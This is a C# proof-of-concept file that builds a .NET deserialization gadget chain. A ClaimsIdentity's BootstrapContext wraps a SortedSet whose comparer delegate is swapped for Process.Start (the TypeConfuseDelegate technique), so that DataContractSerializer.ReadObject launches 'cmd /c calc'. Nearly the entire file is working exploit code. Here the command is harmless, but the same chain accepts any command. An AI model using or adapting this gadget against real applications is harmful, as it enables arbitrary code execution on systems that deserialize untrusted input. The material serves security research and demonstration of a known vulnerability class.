using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Security.Claims;

namespace DeserializePOC01
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ClaimsIdentity gadget = ClaimsIdentityGadget("calc");

            // create a big buffer since we don't know what the object size will be
            byte[] initialObjectBuffer = new byte[0x1000];

            // create a stream pointing at the buffer
            MemoryStream stream = new MemoryStream(initialObjectBuffer);

            // serialize the object into the stream
            DataContractSerializer serializer = new DataContractSerializer(gadget.GetType());
            serializer.WriteObject(stream, gadget);

            // create a new buffer that is the exact size of the serialize object
            byte[] finalObjectBuffer = new byte[stream.Position];

            // copy the object into the new buffer
            Array.Copy(initialObjectBuffer, finalObjectBuffer, stream.Position);

            // create stream pointing at the serialized object
            stream = new MemoryStream(finalObjectBuffer);
            //stream.Position = 0;

            // deserialize it and get code execution
            serializer.ReadObject(stream);
        }

        public static ClaimsIdentity ClaimsIdentityGadget(string cmd)
        {
            ClaimsIdentity id = new ClaimsIdentity();
            id.BootstrapContext = TypeConfuseDelegateGadget(cmd);
            return id;
        }

        public static SortedSet<string> TypeConfuseDelegateGadget(string cmd)
        {

            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }
    }
}
